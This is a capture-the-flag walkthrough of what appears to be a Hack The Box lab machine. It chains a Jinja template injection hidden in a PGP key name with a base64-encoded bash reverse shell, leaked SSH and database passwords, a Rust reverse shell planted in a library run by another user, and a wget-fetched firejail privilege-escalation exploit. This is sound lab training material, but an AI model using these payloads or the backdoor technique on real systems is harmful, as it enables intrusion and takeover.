
I began with a simple scan, to check the ports of the machine.

Found this port 

~~~
nmap -sCV -p 22,80,443 - 10.10.11.218  
~~~

~~~
nmap -sCV -p 22,80,443 - 10.10.11.218        

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


~~~

~~~
gobuster dir -u https://$IP -w /usr/share/payloads/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -k
~~~

~~~
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.11.218
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/payloads/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/06/17 13:28:05 Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 3543]
/about                (Status: 200) [Size: 5584]
/login                (Status: 200) [Size: 4392]
/view                 (Status: 302) [Size: 225] [--> /login?next=%2Fview]
/admin                (Status: 302) [Size: 227] [--> /login?next=%2Fadmin]
/guide                (Status: 200) [Size: 9043]                          
/pgp                  (Status: 200) [Size: 3187]                          
/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
/process              (Status: 405) [Size: 153]

~~~


I went to the website that is being hosted on port 80, and I saw that there is some sort of PGP stuff. Furthermore, I noticed the following URLs:

~~~
https://ssa.htb/login
https://ssa.htb/
https://ssa.htb/pgp # the site's public key
https://ssa.htb/guide # some sort of playground for PGP
https://ssa.htb/contact
https://ssa.htb/guide/verify
https://ssa.htb/about
https://ssa.htb/login?next=%2Fadmin
https://ssa.htb/guide/encrypt
~~~

In the `/guide` endpoint there is some sort of playground for PGP, and while I was playing with it, I have noticed that when I am using the verify signature there is output that looked like pulled from the console.

I’ve enumerated the technologies and versions that the website is using, I found that it used Flask as the main server application and (possibly Flask for the frontend/templating engine).

## ## RCE

When I saw Flask I thought that the application could be using Jinja, so I immediately thought that this could be a potential [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). I had only a single entry point that could give me output which was through `Verify Signature` in the `/guide` endpoint.

Reference Link : https://linuxhint.com/generate-pgp-keys-gpg/
						   https://www.sobyte.net/post/2021-12/modify-gpg-uid-name/

Consequently, we took the initiative to inject a payload into the name attribute to assess the application's susceptibility to SSTI. Employing a straightforward mathematical operation as our payload, we have successfully ascertained that the application is indeed vulnerable to this particular security flaw.

![[Pasted image 20230625043418.png]]


~~~
### Crafting the exploit

The injection point is the `name` of the PGP key, so I’ve generated a key called `mrgod`.
~~~

~~~
gpg --gen-key
~~~

Payload:

~~~
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "echo BASE64-REV | base64 -d | bash" ').read() }}
~~~


![[Pasted image 20230625010229.png]]


After that, we need to export the public key using this command:

~~~
gpg -a -o public_key.key --export mrgod
~~~


then we should craft an arbitrary message:

~~~
echo 'test' | gpg --clear-sign
~~~


~~~
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGSSzRMBDACdrFolPzDX9jWdCRMZIqPTysAbT5cZzyYCysvQLjQnmv/RJ5dF
bez70zm3xHFZmGyK4cjy1icHGaDphE3aJMoGNotaZJp1Pw1OI+c7wtTLc0afvYEC
Yee4YehVRy1gotEfNLfHuhl1fFsNQhQA7suzYUIOz8BXv2VkSvkE4nr7nLyDC95Q
MvQ6fPJZBhaZG7gKvxHAW51TlELhcyz//p41wMLBQMMUWcbLEXpQeu8vqEzSmWq5
BlfjlPNRZStCzRXoD1DX9z4Iokodnf4ywu+2p1hhu9ayTiHa1YZTEEbNZqHnvztb
jpT5niSsG/ExndN7VWHQgRchGHPLj2du0Z3DBpV/oEpr/6nC+VWavd7si5hVc4YV
h8jyE4/hs8bg7rX6S4I01ZhUQaxD8lk2HxrmxTT59x5cBW5hOUTrLdmR/3k/aTNR
s3Q/x08U0D31BT5kUpEmY35w3G9GQM5pFCjOhPwL12VXGDcSxMrkPsJP91sw5Bs9
XOjZ4IMzwbjTXIkAEQEAAbS0e3sgc2VsZi5fX2luaXRfXy5fX2dsb2JhbHNfXy5f
X2J1aWx0aW5zX18uX19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyAiWW1GemFD
QXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4Tmk0NU9DOHhNak0wSURBK0pq
RT0iIHwgYmFzZTY0IC1kIHwgYmFzaCcpLnJlYWQoKSB9fSAoc3lsKSA8c3lsQHN5
bC5zeWw+iQHUBBMBCgA+FiEEIQVF6GaX2XOH6iHK3RuZneASoPwFAmSWz+8CGwMF
CQPCZwAFCwkIBwIGFQoJCAsCBBYCAwECHgECF4AACgkQ3RuZneASoPxoOQv/eciM
gHW2lJbi8MQ9lUTGUEatWFqIPQlXRDyT4Wb+KEtzJfBP/3zU/L3MesKXapMx1Wfe
V0+d3eqaA/8IufbsbBB7z93fcqp6Z2nmUKJFjLkINQIEmYaQJBXMJxYdR6K9KCV3
PEIPZ4UMfMtQChvMevnHlPWr4rctw1gZi/N2Shen1ObBYZXAd0UzEShQ8vgRoVhl
TbDparKFaIhiSzaC6ZDkClvxVboJAN1TmqhPW8/uerPRgw3F2i9oE03UfFZRx8Nw
4rzDEjFyeI7YXSsVO7qNcO/u1ww6fNVek1VDe/veYFh/HRDnDM1PjRCFFHTzrP3m
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
=DYZM
-----END PGP PUBLIC KEY BLOCK-----
~~~


~~~
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512


-----BEGIN PGP SIGNATURE-----

iQGzBAEBCgAdFiEEIQVF6GaX2XOH6iHK3RuZneASoPwFAmSW0DwACgkQ3RuZneAS
oPwrkQv+L1X/31iT024RoYM5Y2W9k0tOAaYKXV1pavoVQIw1roCIn1qLNFoU+qB9
Jwk/0S/7ewmlqGziA5U6H6u3gcpLx8SOWiJV5C/IrOmHhhBN/6cOH1Tv42A867dx
TbE4+rLxtta0J/UAH2aQye8PBPqT1/SzA+AdKP189Gh2Fm1Oc0yLqvqnt93YvPfd
Vy9A/Px48mJ9pIRCfYhntmu9+K5Xk/cINEa2bpB7bNCuTEKKMgLH4RgsORFUt3xu
+4x1NKgMkeS2jQMZWL5pKMGkQ7/ZxA8wDJoyOGuqea1njw7xgiiA3Yw9Ir6V4V/7
hH25/hgz37pCVE+kfkXqHyIKRVaJ1MeC8wtQ2BwNFSzTF4Rpe/6WSi/tHhLAsxIY
dNAHgE+svwfbdhXbxK60us3ZzLz6TdY4Fbb4PG4yjT7CrRr4nIu+Pr0tyPnGiVbq
QMz42muE6d9bfXl4QzGHw7LHsmEMgFrcFjnMCOYE5KHGKj2rHxgiktEyb0glB2Bc
EoXYgZtS
=6hUX
-----END PGP SIGNATURE-----
~~~

![[Pasted image 20230625010024.png]]



~~~
nc -lvnp 1234
~~~

![[Pasted image 20230625005815.png]]

Found admin.json  in 

~~~
~/.config/httpie/sessions/localhost_5000
~~~

cat admin.json

~~~{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}

~~~


![[Pasted image 20230625005608.png]]

Login with SSH :

~~~
sudo ssh silentobserver@ssa.htb
~~~

~~~
Passsword : quietLiketheWind22
~~~

I got the user flag there ,

I run the pspy64 and found this process..!!!

![[Pasted image 20230625005649.png]]

### For root flag

~~~
Tipnet Application

This application is running like that:

/bin/sh -c cd /opt/tipnet && bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline sleep 10

We can see the user atlas(not firejailed) is running it, so this could be our next attack vector.

I’ve crafted a rust reverse shell: https://doc.rust-lang.org/std/process/struct.Command.html and added it into the logger/src/lib.rs file then I build the crate using cargo build.

After some seconds, your listener should be getting a connection from the server, that would be the atlas user.

~~~

Found this by importing pspy64

I found this opt/tipnet/src/

~~~
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("                                                     
             ,,                                      
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm    
P'   MM   `7               MMN.    M           MM    
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm  
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM    
     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 
                  MM                                 
                .JMML.                               

");


    let mode = get_mode();

    if mode == "" {
       return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();


    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username 
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

    let valid = false;
    let mut mode = String::new();

    while ! valid {
        mode.clear();

        println!("Select mode of usage:");
        print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

        io::stdin().read_line(&mut mode).unwrap();

        match mode.trim() {
            "a" => {
                 println!("\n[+] Upstream selected");
                 return "upstream".to_string();
            }
            "b" => {
                 println!("\n[+] Muscular selected");
                 return "regular".to_string();
            }
            "c" => {
                 println!("\n[+] Tempora selected");
                 return "emperor".to_string();
            }
            "d" => {
                println!("\n[+] PRISM selected");
                return "square".to_string();
            }
            "e" => {
                println!("\n[!] Refreshing indeces!");
                return "pull".to_string();
            }
            "q" | "Q" => {
                println!("\n[-] Quitting");
                return "".to_string();
            }
            _ => {
                println!("\n[!] Invalid mode: {}", mode);
            }
        }
    }
    return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
~~~

I used chatgpt here to understand the program..!! Line by line.

I got little stucked , i got advice from my friend @miblak

~~~
You must edit rust file, add to the file reverse shell, compile

And abuse tipnet file to use lib.rs

You have only 2 minutes

Because after this time lib.rs will be reset

~~~

So i framed rust using chatgpt + https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs

As he said it is resetting really very fast , 

At the same time we have access to write the file, Yeah..!!Luck

~~~
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

pub fn log(_user: &str, _query: &str, _justification: &str) {
    let sock = TcpStream::connect("10.10.16.98:4321").unwrap();
    let fd = sock.as_raw_fd();

    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
~~~

~~~
cargo build
~~~

Now after some seconds we will get shell..!!
![[Pasted image 20230625041702.png]]
But dont forgot to get two shells..!


During the enumeration of the binaries with SUID permissions, we have discovered the firejail binary, and luckily, we have the necessary execute permissions to use it, since we are part of the 'jailer' group.

~~~
find \-perm -4000 -user root 2>/dev/null
~~~

![[Pasted image 20230625042239.png]]

[Firejail suid Exploit](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25)

We have found an exploit that will give us the opportunity to escalate privileges by taking advantage of the vulnerabilities present in firejail.

so keep in mind we need two shells,

![[Pasted image 20230625041702.png]]

![[Pasted image 20230625041719.png]]


As we know we are getting shell to run firejoin exploit right ? So we need two shell keep in mind ..!!

Got shell.>!!!


![[Pasted image 20230625041745.png]]

~~~
cd /tmp
~~~

~~~
wget http://10.10.16.98/firejoin.py
~~~

~~~
chmod +x firejoin.py
~~~

~~~
python3 firejoin.py
~~~

~~~
atlas@sandworm:/tmp$ python3 firejoin.py.1
You can now run 'firejail --join=462065' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
~~~


For getting root flag..!!

In other shell,

~~~
firejail --join=462065
~~~

~~~
su
~~~

~~~
cat /root/root.txt
233151bfaf746d8e39b0f3daa01e41a2
~~~

![[Pasted image 20230625042014.png]]